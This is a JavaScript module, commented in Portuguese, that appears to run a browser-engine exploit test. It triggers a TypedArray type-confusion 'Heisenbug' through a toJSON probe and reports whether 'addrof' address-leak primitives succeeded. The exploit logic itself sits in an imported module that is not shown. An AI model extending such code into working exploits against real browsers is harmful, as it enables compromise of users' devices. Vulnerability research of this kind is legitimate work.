// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_ReFocus_FixRefError,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ReFocus_FixRefError";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (ReFocus_FixRefError) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_ReFocus_FixRefError(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-RFCTO-FRE) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda (capturados): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output: ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedByLastProbe = false;
        if (result.toJSON_details && 
            result.toJSON_details.this_type === "[object Object]") { 
            heisenbugConfirmedByLastProbe = true;
        }

        let anyAddrofSuccess = false;
        const addrofChecks = [
            {name: "VictimA", res: result.addrof_victim_A},
            {name: "VictimB", res: result.addrof_victim_B},
            {name: "ConfusedA", res: result.addrof_confused_A},
            {name: "ConfusedB", res: result.addrof_confused_B}
        ];

        addrofChecks.forEach(item => {
            if (item.res && item.res.success) {
                 logS3(`     ADDROF ${item.name} SUCESSO! ${item.res.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
            } else if (item.res) {
                 logS3(`     ADDROF ${item.name} FALHOU: ${item.res.msg}`, "warn", FNAME_RUNNER);
            }
        });


        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
            logS3(`     ERRO INTERNO NA ÚLTIMA SONDA: ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-RFCTO-FRE) toJSON_ERR`;
        } else if (heisenbugConfirmedByLastProbe) {
            logS3(`     !!!! TYPE CONFUSION NO 'this' DA ÚLTIMA SONDA OBSERVADA !!!! Call #${result.toJSON_details.call_number}, Tipo: ${result.toJSON_details.this_type}`, "critical", FNAME_RUNNER);
            if (result.toJSON_details.this_is_victim_array !== undefined) { 
                logS3(`       Na última sonda ('this' confuso), 'this' === victim? ${result.toJSON_details.this_is_victim_array}`, "info");
            }
            // ... (outros logs de detalhes da sonda se necessário) ...

            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-RFCTO-FRE) Sonda OK, Addr Fail`;
            } else {
                 document.title = `Heisenbug (TypedArray-RFCTO-FRE) Addr SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-RFCTO-FRE) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (ReFocus_FixRefError) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ReFocus_FixRefError) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Sonda OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE} Concluído`;
        }
    }
}
